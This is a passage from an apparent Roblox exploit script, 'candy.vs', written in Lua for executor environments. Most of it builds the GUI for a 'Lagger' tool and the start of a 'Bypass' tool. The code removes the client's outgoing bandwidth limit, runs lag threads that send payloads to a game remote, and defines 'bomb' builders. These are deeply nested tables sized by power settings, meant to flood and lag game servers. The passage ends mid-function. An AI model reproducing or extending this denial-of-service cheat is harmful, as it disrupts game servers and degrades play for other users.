	lagThreads.Payload = nil
	lagThreads.PayloadAmount = nil
	lagThreads.Remote = nil
	pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
	end
	_G.__CandyVSTrackStopper(stopAllLaggerThreads)

	local function toggleMainLagger()
	laggerStates.Main = not laggerStates.Main
	if laggerStates.Main then
	if laggerStates.LowEnd then
	laggerStates.LowEnd = false
	stopThread("LowEnd")
	if _G.__updateSmallLaggerVisual then
	_G.__updateSmallLaggerVisual()
	end
	end
	startMainLag()
	else
	stopThread("Main")
	if not laggerStates.LowEnd then
	pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
	end
	end
	return laggerStates.Main
	end

	local function toggleLowEndLagger()
	laggerStates.LowEnd = not laggerStates.LowEnd
	if laggerStates.LowEnd then
	if laggerStates.Main then
	laggerStates.Main = false
	stopThread("Main")
	end
	startLowEndLag()
	else
	stopThread("LowEnd")
	if not laggerStates.Main then
	pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
	end
	end
	return laggerStates.LowEnd
	end

	local LAGGER_BACKGROUND_URL = "https://files.catbox.moe/ug6eug.png"
	local LAGGER_BACKGROUND_FILE = "CandyVSLagger_ug6eug.png"
	local LAGGER_BACKGROUND_FALLBACK = "rbxassetid://94763047376005"
	local function resolveLaggerBackground()
	local customAssetLoader = nil
	pcall(function()
	customAssetLoader = (typeof(getcustomasset) == "function" and getcustomasset)
	or (typeof(getsynasset) == "function" and getsynasset)
	end)
	if not customAssetLoader or typeof(writefile) ~= "function" or typeof(isfile) ~= "function" then
	return LAGGER_BACKGROUND_FALLBACK
	end
	local hasImage = false
	pcall(function() hasImage = isfile(LAGGER_BACKGROUND_FILE) end)
	if not hasImage then
	local okDownload, imageData = pcall(function() return game:HttpGet(LAGGER_BACKGROUND_URL) end)
	local isPng = okDownload and type(imageData) == "string"
	and imageData:sub(1, 8) == "\137PNG\r\n\26\n"
	if not isPng then
	warn("CandyVS Lagger: no se pudo descargar el fondo ug6eug")
	return LAGGER_BACKGROUND_FALLBACK
	end
	local okWrite = pcall(writefile, LAGGER_BACKGROUND_FILE, imageData)
	if not okWrite then return LAGGER_BACKGROUND_FALLBACK end
	end
	local okAsset, customAsset = pcall(customAssetLoader, LAGGER_BACKGROUND_FILE)
	if okAsset and type(customAsset) == "string" and customAsset ~= "" then return customAsset end
	return LAGGER_BACKGROUND_FALLBACK
	end

	local BACKGROUNDS = { resolveLaggerBackground() }
	local currentBackground = 1

	local WHITE = Color3.fromRGB(235, 240, 245)

	local boundKey = Enum.KeyCode.V
	local waitingForKey = false
	local keyConn = nil
	local keybindButton = nil
	local keybindStroke = nil
	local keybindJustSet = false

	local SETTINGS_FILE = "CandyVSLagger_Settings.json"
	local mainFrame, bgImage
	local laggerMinimized = false
	local refreshLaggerThemeText

	local function fileFunctionsAvailable()
	return typeof(writefile) == "function" and typeof(readfile) == "function" and typeof(isfile) == "function"
	end

	local function saveSettings()
	if not fileFunctionsAvailable() or not mainFrame then return end
	local data = {
	engineVersion = "legacy",
	mainEnabled = laggerStates.Main,
	lowEndEnabled = laggerStates.LowEnd,
	power = LAGGER_CONFIG.TableIncrease,
	background = currentBackground,
	keybind = boundKey and boundKey.Name or "V",
	visible = mainFrame.Visible,
	minimized = laggerMinimized,
	position = {
	xScale = mainFrame.Position.X.Scale,
	xOffset = mainFrame.Position.X.Offset,
	yScale = mainFrame.Position.Y.Scale,
	yOffset = mainFrame.Position.Y.Offset,
	},
	}
	pcall(function() writefile(SETTINGS_FILE, HttpService:JSONEncode(data)) end)
	end

	local function loadSettings()
	if not fileFunctionsAvailable() then return nil end
	local ok, result = pcall(function()
	if isfile(SETTINGS_FILE) then return HttpService:JSONDecode(readfile(SETTINGS_FILE)) end
	return nil
	end)
	return ok and result or nil
	end

	local GAMEPAD_KEY_NAMES = {
	ButtonA = "PAD A", ButtonB = "PAD B", ButtonX = "PAD X", ButtonY = "PAD Y",
	ButtonL1 = "PAD L1", ButtonR1 = "PAD R1", ButtonL2 = "PAD L2", ButtonR2 = "PAD R2",
	ButtonL3 = "PAD L3", ButtonR3 = "PAD R3", ButtonStart = "PAD START", ButtonSelect = "PAD SELECT",
	DPadUp = "DPAD UP", DPadDown = "DPAD DOWN", DPadLeft = "DPAD LEFT", DPadRight = "DPAD RIGHT",
	}
	local function isGamepadInput(input)
	return input and input.UserInputType and input.UserInputType.Name:match("^Gamepad%d+$") ~= nil
	end
	local function keyName(kc)
	return GAMEPAD_KEY_NAMES[kc.Name] or kc.Name
	end

	local function updateKeybindDisplay()
	if keybindButton then
	keybindButton.Text = keyName(boundKey)
	keybindButton.TextColor3 = WHITE
	keybindButton.BackgroundTransparency = 0.2
	end
	if keybindStroke then
	keybindStroke.Color = Color3.fromRGB(0, 0, 0)
	end
	end

	local function stopListening()
	waitingForKey = false
	keybindJustSet = false
	if keyConn then
	keyConn:Disconnect()
	keyConn = nil
	end
	updateKeybindDisplay()
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "CandyVSLaggerGUI"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Parent = playerGui
	_G.__CandyVSRegisterThemeRoot(screenGui)

	mainFrame = Instance.new("Frame")
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.fromOffset(270, 116)
	mainFrame.Position = UDim2.new(0.5, -135, 0.5, -58)
	mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	mainFrame.BackgroundTransparency = 0
	mainFrame.BorderSizePixel = 0
	mainFrame.ClipsDescendants = true
	mainFrame.Active = true
	mainFrame.Parent = screenGui
	mainFrame.Visible = false

	Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)
	local mainStroke = Instance.new("UIStroke", mainFrame)
	mainStroke.Color = Color3.fromRGB(30, 30, 30)
	mainStroke.Thickness = 1
	mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	mainStroke.Transparency = 1

	bgImage = Instance.new("ImageLabel")
	bgImage.Name = "BackgroundImage"
	bgImage.Size = UDim2.new(1, 0, 1, 0)
	bgImage.Position = UDim2.new(0, 0, 0, 0)
	bgImage.BackgroundTransparency = 1
	bgImage.Image = BACKGROUNDS[1]
	bgImage.ScaleType = Enum.ScaleType.Crop
	bgImage.ImageTransparency = 0
	bgImage.ZIndex = 0
	bgImage.Parent = mainFrame
	bgImage.Visible = true
	Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 16)
	_G.__CandyVSRoundPanelBackground(bgImage, mainFrame)
	_G.__CandyVSAddUnifiedPanelShade(mainFrame, 16, 1)

	local headerFrame = Instance.new("Frame")
	headerFrame.Name = "Header"
	headerFrame.Size = UDim2.new(1, -12, 0, 30)
	headerFrame.Position = UDim2.fromOffset(6, 6)
	headerFrame.BackgroundTransparency = 1
	headerFrame.ZIndex = 2
	headerFrame.Parent = mainFrame

	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Text = "candy.vs"
	title.Font = Enum.Font.FredokaOne
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextSize = 16
	title.BackgroundTransparency = 1
	title.Position = UDim2.fromOffset(10, 0)
	title.Size = UDim2.fromOffset(62, 20)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.ZIndex = 3
	title.Parent = headerFrame

	local laggerTitle = Instance.new("TextLabel")
	laggerTitle.Name = "LaggerLabel"
	laggerTitle.Text = "LAGGER"
	laggerTitle.Font = Enum.Font.FredokaOne
	laggerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	laggerTitle.TextSize = 13
	laggerTitle.BackgroundTransparency = 1
	laggerTitle.Position = UDim2.fromOffset(70, 1)
	laggerTitle.Size = UDim2.fromOffset(58, 18)
	laggerTitle.TextXAlignment = Enum.TextXAlignment.Left
	laggerTitle.ZIndex = 3
	laggerTitle.Parent = headerFrame
	title.AnchorPoint = Vector2.new(0.5, 0)
	title.Position = UDim2.new(0.5, 0, 0, 12)
	title.Size = UDim2.fromOffset(194, 26)
	_G.__CandyVSAddOriginalGui3Title(title, "Lagger")
	refreshLaggerThemeText = function()
	title.Visible = false
	end
	refreshLaggerThemeText()



	local closeButton = Instance.new("TextButton")
	closeButton.Name = "Close"
	closeButton.Text = "X"
	closeButton.Font = Enum.Font.FredokaOne
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.TextSize = 14
	closeButton.BackgroundTransparency = 1
	closeButton.Size = UDim2.fromOffset(20, 20)
	closeButton.Position = UDim2.new(1, -20, 0, 0)
	closeButton.ZIndex = 3
	closeButton.Parent = headerFrame

	local minimizeButton = Instance.new("TextButton")
	minimizeButton.Name = "Minimize"
	minimizeButton.Text = "-"
	minimizeButton.Font = Enum.Font.FredokaOne
	minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	minimizeButton.TextSize = 16
	minimizeButton.BackgroundTransparency = 1
	minimizeButton.Size = UDim2.fromOffset(20, 20)
	minimizeButton.Position = UDim2.new(1, -44, 0, 0)
	minimizeButton.ZIndex = 3
	minimizeButton.Parent = headerFrame

	local minimizedToggleButton = Instance.new("TextButton")
	minimizedToggleButton.Name = "MinimizedToggle"
	minimizedToggleButton.Text = "LAG: OFF"
	minimizedToggleButton.Font = Enum.Font.FredokaOne
	minimizedToggleButton.TextColor3 = Color3.fromRGB(235, 240, 245)
	minimizedToggleButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	minimizedToggleButton.TextStrokeTransparency = 1
	minimizedToggleButton.TextSize = 11
	minimizedToggleButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	minimizedToggleButton.BackgroundTransparency = 0.1
	minimizedToggleButton.BorderSizePixel = 0
	minimizedToggleButton.AutoButtonColor = false
	minimizedToggleButton.Size = UDim2.fromOffset(72, 22)
	minimizedToggleButton.Position = UDim2.new(1, -120, 0, -1)
	minimizedToggleButton.Visible = false
	minimizedToggleButton.ZIndex = 5
	minimizedToggleButton.Parent = headerFrame
	Instance.new("UICorner", minimizedToggleButton).CornerRadius = UDim.new(0, 7)
	local minimizedToggleStroke = Instance.new("UIStroke", minimizedToggleButton)
	minimizedToggleStroke.Color = Color3.fromRGB(0, 0, 0)
	minimizedToggleStroke.Thickness = 1

	local controlFrame = Instance.new("Frame")
	controlFrame.Name = "Controls"
	controlFrame.Size = UDim2.new(1, -12, 0, 35)
	controlFrame.Position = UDim2.fromOffset(6, 73)
	controlFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	controlFrame.BackgroundTransparency = 0.5
	controlFrame.BorderSizePixel = 0
	controlFrame.ZIndex = 2
	controlFrame.Parent = mainFrame
	Instance.new("UICorner", controlFrame).CornerRadius = UDim.new(0, 10)

	keybindButton = Instance.new("TextButton")
	keybindButton.Name = "KeybindButton"
	keybindButton.Size = UDim2.fromOffset(32, 27)
	keybindButton.Position = UDim2.new(0, 6, 0.5, -13.5)
	keybindButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	keybindButton.BackgroundTransparency = 0
	keybindButton.AutoButtonColor = false
	keybindButton.Font = Enum.Font.FredokaOne
	keybindButton.Text = keyName(boundKey)
	keybindButton.TextColor3 = WHITE
	keybindButton.TextSize = 10
	keybindButton.ZIndex = 3
	keybindButton.Parent = controlFrame
	Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 6)
	keybindStroke = Instance.new("UIStroke", keybindButton)
	keybindStroke.Color = Color3.fromRGB(50, 50, 50)
	keybindStroke.Thickness = 1
	keybindStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local toggleLabel = Instance.new("TextLabel")
	toggleLabel.Name = "Status"
	toggleLabel.Text = "LAGGER: OFF"
	toggleLabel.Font = Enum.Font.FredokaOne
	toggleLabel.TextColor3 = WHITE
	toggleLabel.TextSize = 9
	toggleLabel.BackgroundTransparency = 1
	toggleLabel.Position = UDim2.fromScale(0, 0)
	toggleLabel.Size = UDim2.fromScale(1, 1)
	toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
	toggleLabel.ZIndex = 3
	toggleLabel.Parent = controlFrame

	local switchBackground = Instance.new("Frame")
	switchBackground.Name = "Switch"
	switchBackground.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	switchBackground.BorderSizePixel = 0
	switchBackground.Size = UDim2.fromOffset(32, 18)
	switchBackground.Position = UDim2.new(1, -38, 0.5, -9)
	switchBackground.ZIndex = 3
	switchBackground.Parent = controlFrame
	Instance.new("UICorner", switchBackground).CornerRadius = UDim.new(1, 0)

	local toggleKnob = Instance.new("Frame")
	toggleKnob.Name = "Knob"
	toggleKnob.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	toggleKnob.BorderSizePixel = 0
	toggleKnob.Size = UDim2.fromOffset(12, 12)
	toggleKnob.Position = UDim2.new(0, 3, 0.5, -6)
	toggleKnob.ZIndex = 4
	toggleKnob.Parent = switchBackground
	Instance.new("UICorner", toggleKnob).CornerRadius = UDim.new(1, 0)

	local toggleButton = Instance.new("TextButton")
	toggleButton.Name = "ToggleButton"
	toggleButton.Text = ""
	toggleButton.BackgroundTransparency = 1
	toggleButton.Position = UDim2.fromOffset(44, 0)
	toggleButton.Size = UDim2.new(1, -44, 1, 0)
	toggleButton.ZIndex = 5
	toggleButton.Parent = controlFrame
	local themesFrame = nil

	local powerFrame = Instance.new("Frame")
	powerFrame.Name = "PowerControl"
	powerFrame.Size = UDim2.new(1, -12, 0, 43)
	powerFrame.Position = UDim2.fromOffset(6, 80)
	powerFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	powerFrame.BackgroundTransparency = 0.5
	powerFrame.BorderSizePixel = 0
	powerFrame.ZIndex = 2
	powerFrame.Parent = mainFrame
	powerFrame.Visible = false
	Instance.new("UICorner", powerFrame).CornerRadius = UDim.new(0, 10)

	local powerLabel = Instance.new("TextLabel")
	powerLabel.Name = "PowerValue"
	powerLabel.Size = UDim2.new(1, -12, 0, 16)
	powerLabel.Position = UDim2.fromOffset(6, 2)
	powerLabel.BackgroundTransparency = 1
	powerLabel.Font = Enum.Font.FredokaOne
	powerLabel.TextColor3 = WHITE
	powerLabel.TextSize = 10
	powerLabel.TextXAlignment = Enum.TextXAlignment.Left
	powerLabel.ZIndex = 3
	powerLabel.Parent = powerFrame

	local powerBar = Instance.new("Frame")
	powerBar.Name = "Bar"
	powerBar.Size = UDim2.new(1, -12, 0, 8)
	powerBar.Position = UDim2.new(0, 6, 1, -15)
	powerBar.BackgroundColor3 = Color3.fromRGB(42, 42, 48)
	powerBar.BorderSizePixel = 0
	powerBar.ZIndex = 3
	powerBar.Parent = powerFrame
	Instance.new("UICorner", powerBar).CornerRadius = UDim.new(1, 0)

	local powerFill = Instance.new("Frame")
	powerFill.Name = "Fill"
	powerFill.Size = UDim2.fromScale(0, 1)
	powerFill.BackgroundColor3 = Color3.fromRGB(235, 240, 245)
	powerFill.BorderSizePixel = 0
	powerFill.ZIndex = 4
	powerFill.Parent = powerBar
	Instance.new("UICorner", powerFill).CornerRadius = UDim.new(1, 0)

	local powerKnob = Instance.new("Frame")
	powerKnob.Name = "Knob"
	powerKnob.AnchorPoint = Vector2.new(0.5, 0.5)
	powerKnob.Size = UDim2.fromOffset(14, 14)
	powerKnob.Position = UDim2.new(0, 0, 0.5, 0)
	powerKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	powerKnob.BorderSizePixel = 0
	powerKnob.ZIndex = 5
	powerKnob.Parent = powerBar
	Instance.new("UICorner", powerKnob).CornerRadius = UDim.new(1, 0)

	local powerHitbox = Instance.new("TextButton")
	powerHitbox.Name = "PowerSlider"
	powerHitbox.Size = UDim2.new(1, 12, 0, 24)
	powerHitbox.Position = UDim2.new(0, -6, 0.5, -12)
	powerHitbox.BackgroundTransparency = 1
	powerHitbox.Text = ""
	powerHitbox.Active = true
	powerHitbox.ZIndex = 6
	powerHitbox.Parent = powerBar

	local powerSliderDragging = false
	local function setLaggerPower(value, persist)
	value = math.clamp(math.floor((tonumber(value) or 0) + 0.5), 0, LAGGER_POWER_MAX)
	LAGGER_CONFIG.TableIncrease = value
	local ratio = value / LAGGER_POWER_MAX
	powerFill.Size = UDim2.fromScale(ratio, 1)
	powerKnob.Position = UDim2.new(ratio, 0, 0.5, 0)
	powerLabel.Text = "POWER: " .. tostring(value)
	if persist then saveSettings() end
	end
	local function updatePowerFromInput(input)
	local width = powerBar.AbsoluteSize.X
	if width <= 0 then return end
	local ratio = math.clamp((input.Position.X - powerBar.AbsolutePosition.X) / width, 0, 1)
	setLaggerPower(ratio * LAGGER_POWER_MAX, false)
	end
	setLaggerPower(LAGGER_CONFIG.TableIncrease, false)
	powerHitbox.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	powerSliderDragging = true
	updatePowerFromInput(input)
	end
	end)
	_G.__CandyVSTrackConn(UserInputService.InputChanged:Connect((function(input)
	if powerSliderDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	updatePowerFromInput(input)
	end
	end)))
	_G.__CandyVSTrackConn(UserInputService.InputEnded:Connect(function(input)
	if powerSliderDragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
	powerSliderDragging = false
	setLaggerPower(LAGGER_CONFIG.TableIncrease, true)
	end
	end))

	keybindButton.Activated:Connect(function()
	if waitingForKey then return end
	waitingForKey = true
	keybindButton.Text = "..."
	keybindButton.TextColor3 = WHITE
	keybindButton.BackgroundTransparency = 0.6
		if keybindStroke then keybindStroke.Color = Color3.fromRGB(0, 0, 0) end
	keyConn = UserInputService.InputBegan:Connect(function(input)
	if not waitingForKey then return end
	local keyboardInput = input.UserInputType == Enum.UserInputType.Keyboard
	local gamepadInput = isGamepadInput(input)
	if keyboardInput or gamepadInput then
	if input.KeyCode == Enum.KeyCode.Unknown then return end
	if keyboardInput and input.KeyCode == Enum.KeyCode.Escape then
	stopListening()
	return
	end
	boundKey = input.KeyCode
	waitingForKey = false
	keybindJustSet = true
	if keyConn then keyConn:Disconnect(); keyConn = nil end
	updateKeybindDisplay()
	saveSettings()
	task.delay(0.3, function() keybindJustSet = false end)
	end
	end)
	task.delay(5, function()
	if waitingForKey then stopListening() end
	end)
	end)

	local function setToggleVisual(active, animated)
	local knobPosition = active and UDim2.new(1, -17, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
	if animated then
	TweenService:Create(toggleKnob, TweenInfo.new(0.15), { Position = knobPosition }):Play()
	else
	toggleKnob.Position = knobPosition
	end
	toggleLabel.Text = active and "LAGGER: ON" or "LAGGER: OFF"
	minimizedToggleButton.Text = active and "LAG: ON" or "LAG: OFF"
	minimizedToggleButton.BackgroundColor3 = active and Color3.fromRGB(205, 210, 215) or Color3.fromRGB(35, 35, 35)
	minimizedToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	end

	toggleButton.MouseButton1Click:Connect(function()
	local newState = toggleMainLagger()
	setToggleVisual(newState, true)
	saveSettings()
	end)
	minimizedToggleButton.Activated:Connect(function()
	local newState = toggleMainLagger()
	setToggleVisual(newState, true)
	saveSettings()
	end)

	closeButton.MouseButton1Click:Connect(function()
	mainFrame.Visible = false
	laggerToggled = false
	updateLaggerVisual()
	saveSettings()
	end)

	local originalSize = UDim2.fromOffset(270, 116)
	local minimizedSize = UDim2.fromOffset(270, 30)
	local function applyLaggerMinimized(minimized, animated)
	laggerMinimized = minimized == true
	minimizeButton.Text = laggerMinimized and "+" or "-"
	minimizedToggleButton.Visible = laggerMinimized
	controlFrame.Visible = not laggerMinimized
	powerFrame.Visible = false
	local targetSize = laggerMinimized and minimizedSize or originalSize
	if animated then
	TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize}):Play()
	else
	mainFrame.Size = targetSize
	end
	end
	minimizeButton.Activated:Connect(function()
	applyLaggerMinimized(not laggerMinimized, true)
	saveSettings()
	end)

	_G.__CandyVSTrackConn(UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if waitingForKey then return end
	if keybindJustSet then return end
	local gamepadInput = isGamepadInput(input)
	if gameProcessed and not gamepadInput then return end
	if input.UserInputType ~= Enum.UserInputType.Keyboard and not gamepadInput then return end
	if input.KeyCode ~= boundKey then return end
	local newState = toggleMainLagger()
	setToggleVisual(newState, true)
	saveSettings()
	end))

	local dragSaveGen = 0
	mainFrame:GetPropertyChangedSignal("Position"):Connect(function()
	dragSaveGen = dragSaveGen + 1
	local thisGen = dragSaveGen
	task.delay(0.3, function()
	if thisGen == dragSaveGen then saveSettings() end
	end)
	end)

	local dragging = false
	local dragStart, startPosition
	mainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	dragging = true
	dragStart = input.Position
	startPosition = mainFrame.Position
	end
	end)
	_G.__CandyVSTrackConn(UserInputService.InputChanged:Connect((function(input)
	if not dragging then return end
	if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
	local delta = input.Position - dragStart
	mainFrame.Position = UDim2.new(startPosition.X.Scale, startPosition.X.Offset + delta.X, startPosition.Y.Scale, startPosition.Y.Offset + delta.Y)
	end)))
	_G.__CandyVSTrackConn(UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
	end))

	local function applySavedSettings()
	local data = loadSettings()
	if not data then
	setToggleVisual(false, false)
	updateKeybindDisplay()
	mainFrame.Visible = openPanel == true
	laggerToggled = mainFrame.Visible
	updateLaggerVisual()
	saveSettings()
	return
	end
	if data.keybind then
	local kc = Enum.KeyCode[data.keybind]
	if kc then boundKey = kc end
	end
	if data.power ~= nil then
	local savedPower = tonumber(data.power)
	if data.engineVersion ~= "legacy" and savedPower == 90 then savedPower = 270 end
	setLaggerPower(savedPower or LAGGER_CONFIG.TableIncrease, false)
	end
	updateKeybindDisplay()
	if data.mainEnabled ~= nil then
	laggerStates.Main = data.mainEnabled == true and not isMobile
	if laggerStates.Main then startMainLag() end
	setToggleVisual(laggerStates.Main, false)
	end
	if data.lowEndEnabled ~= nil then
	laggerStates.LowEnd = data.lowEndEnabled == true and not isMobile
	if laggerStates.LowEnd then startLowEndLag() end
	end
	if data.background then
	currentBackground = 1
	bgImage.Image = BACKGROUNDS[currentBackground]
	_G.__CandyVSFramePanelBackground(bgImage, currentBackground, "Lagger")
	mainStroke.Transparency = currentBackground == 1 and 1 or 0
	end
	if refreshLaggerThemeText then refreshLaggerThemeText() end
	if data.position and not _G.__CandyVSGuiPositionsReset then
	pcall(function()
	mainFrame.Position = UDim2.new(data.position.xScale, data.position.xOffset, data.position.yScale, data.position.yOffset)
	end)
	end
	applyLaggerMinimized(data.minimized == true, false)
	if data.visible ~= nil then
	mainFrame.Visible = openPanel == true and true or data.visible and true or false
	else
	mainFrame.Visible = openPanel == true
	end
	laggerToggled = mainFrame.Visible
	updateLaggerVisual()
	saveSettings()
	end
	for _, descendant in ipairs(screenGui:GetDescendants()) do
	if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
	descendant:SetAttribute("CandyVSKeepBlackText", true)
	descendant.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	descendant.TextStrokeTransparency = 0.2
	end
	end
	if refreshLaggerThemeText then refreshLaggerThemeText() end
	applySavedSettings()
	currentBackground = 1
	bgImage.Image = BACKGROUNDS[currentBackground]
	_G.__CandyVSFramePanelBackground(bgImage, currentBackground, "Lagger")
	mainStroke.Transparency = currentBackground == 1 and 1 or 0
	if refreshLaggerThemeText then refreshLaggerThemeText() end
	saveSettings()

	_G.CandyVSLagger = {
	Stop = function()
	stopAllLaggerThreads()
	end,
	ResetPosition = function()
	dragging = false
	mainFrame.Position = UDim2.new(0.5, -135, 0.5, -58)
	saveSettings()
	end,
	IsEnabled = function() return laggerStates.Main end,
	IsLowEndEnabled = function() return laggerStates.LowEnd end,
	Toggle = function()
	local newState = toggleMainLagger()
	setToggleVisual(newState, true)
	saveSettings()
	return newState
	end,
	ToggleLowEnd = function()
	local newState = toggleLowEndLagger()
	saveSettings()
	return newState
	end,
	SetEnabled = function(enabled)
	if laggerStates.Main ~= enabled then
	laggerStates.Main = enabled
	if enabled then
	if laggerStates.LowEnd then
	laggerStates.LowEnd = false
	stopThread("LowEnd")
	end
	startMainLag()
	else
	stopThread("Main")
	end
	setToggleVisual(laggerStates.Main, true)
	saveSettings()
	end
	end,
	SetLowEndEnabled = function(enabled)
	if laggerStates.LowEnd ~= enabled then
	laggerStates.LowEnd = enabled
	if enabled then
	if laggerStates.Main then
	laggerStates.Main = false
	stopThread("Main")
	setToggleVisual(false, true)
	end
	startLowEndLag()
	else
	stopThread("LowEnd")
	end
	saveSettings()
	end
	end,
	GetPower = function() return LAGGER_CONFIG.TableIncrease end,
	SetPower = function(power)
	setLaggerPower(power, true)
	end,
	GetKeybind = function() return boundKey end,
	SetKeybind = function(key)
	local kc = nil
	if typeof(key) == "string" then
	kc = Enum.KeyCode[key]
	elseif typeof(key) == "EnumItem" and key.EnumType == Enum.KeyCode then
	kc = key
	end
	if kc then
	boundKey = kc
	updateKeybindDisplay()
	saveSettings()
	end
	end,
	SetBackground = function(index)
	currentBackground = 1
	bgImage.Image = BACKGROUNDS[currentBackground]
	_G.__CandyVSFramePanelBackground(bgImage, currentBackground, "Lagger")
	mainStroke.Transparency = currentBackground == 1 and 1 or 0
	if refreshLaggerThemeText then refreshLaggerThemeText() end
	saveSettings()
	end,
	GetBackground = function() return currentBackground end,
	SetVisible = function(visible)
	if mainFrame then
	local isVisible = visible and true or false
	mainFrame.Visible = isVisible
	laggerToggled = isVisible
	updateLaggerVisual()
	if not isVisible and themesFrame then themesFrame.Visible = false end
	saveSettings()
	end
	end,
	SaveSettings = function()
	saveSettings()
	end,
	}
	end)
	end)
	end

	_G.__openLaggerGUI = openLaggerGUI

	local function closeLaggerGUI()
	laggerToggled = false
	updateLaggerVisual()
	if _G.CandyVSLagger and _G.CandyVSLagger.SetVisible then
	_G.CandyVSLagger.SetVisible(false)
	end
	if _G.CandyVSLagger and _G.CandyVSLagger.SaveSettings then
	_G.CandyVSLagger.SaveSettings()
	end
	end

	connectBtn(laggerBtn, function()
	laggerToggled = not laggerToggled
	updateLaggerVisual()

	if laggerToggled then
	if _G._CandyVSLaggerGUILoaded then
	if _G.CandyVSLagger and _G.CandyVSLagger.SetVisible then
	_G.CandyVSLagger.SetVisible(true)
	end
	if _G.CandyVSLagger and _G.CandyVSLagger.SaveSettings then
	_G.CandyVSLagger.SaveSettings()
	end
	else
	openLaggerGUI(true)
	end
	else
	closeLaggerGUI()
	end
	end)

	do
	local laggerHasSavedState, laggerSavedVisible = _G.__CandyVSReadSavedPanelVisibility("CandyVSLagger_Settings.json")
	laggerToggled = laggerHasSavedState and laggerSavedVisible or false
	updateLaggerVisual()
	if laggerHasSavedState then openLaggerGUI(false) end
	end

	local bypassToggled = false 

	local function updateBypassVisual()
	bypassBtn.BackgroundColor3 = bypassToggled and Color3.fromRGB(80, 160, 255) or Color3.fromRGB(30, 30, 38)
	bypassBtn.TextColor3 = bypassToggled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(50, 110, 190)
		bypassStroke.Color = bypassToggled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)
	bypassStroke.Thickness = bypassToggled and 1.5 or 1
	end

	_G.__syncBypassVisual = function()
	updateBypassVisual()
	end

	local function openBypassGUI(openPanel)
	if openPanel == nil then openPanel = true end
	if openPanel and _G.CandyVSLagger and _G.CandyVSLagger.SetVisible then
	pcall(_G.CandyVSLagger.SetVisible, false)
	end
	local player = game:GetService("Players").LocalPlayer
	local playerGui = player and player:FindFirstChild("PlayerGui")
	if playerGui and playerGui:FindFirstChild("CandyVSBypassGUI") then
	if openPanel then
	pcall(function()
	if _G.CandyVSBypass and _G.CandyVSBypass.SetVisible then
	_G.CandyVSBypass.SetVisible(true)
	end
	end)
	end
	return
	end
	if _G._CandyVSBypassGUILoaded then
	_G._CandyVSBypassGUILoaded = false
	end
	_G._CandyVSBypassGUILoaded = true

	task.spawn(function()
	pcall(function()
	if not candyvsRuntimeState.alive then return end
	local NetworkClient = game:GetService("NetworkClient")
	local player = Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")

	local previousGui = playerGui:FindFirstChild("CandyVSBypassGUI")
	if previousGui then previousGui:Destroy() end

	local BypassConfig = {
	Power = 97000,
	PCPower = 97000,
	MobilePower = 72000,
	Mode = "PC",
	SpamDelay = 0.12,
	Version = "V1",
	DropPaused = false,
	}
	local bypassRunning, bypassBomb, bypassThread = false, nil, nil

	local function buildBombV1(power)
	local depth, main, spam = 186, {}, {{}}
	local z = spam[1]
	for _ = 1, depth do local t = {}; table.insert(z, t); z = t end
	local maxRep = math.floor(power / (depth + 2))
	for _ = 1, maxRep do table.insert(main, spam) end
	return main
	end

	local function buildBombV2(power)
	local depth, main, spam = 296, {}, {{}}
	local z = spam[1]
	for _ = 1, depth do local t = {}; table.insert(z, t); z = t end
	local maxRep = math.floor(power / (depth + 2))
	for _ = 1, maxRep do table.insert(main, spam) end
	return main
	end

	local function buildBomb(power)
	return BypassConfig.Version == "V1" and buildBombV1(power) or buildBombV2(power)
	end

	local function startBypass()
	if bypassRunning then return true end
	bypassRunning = true
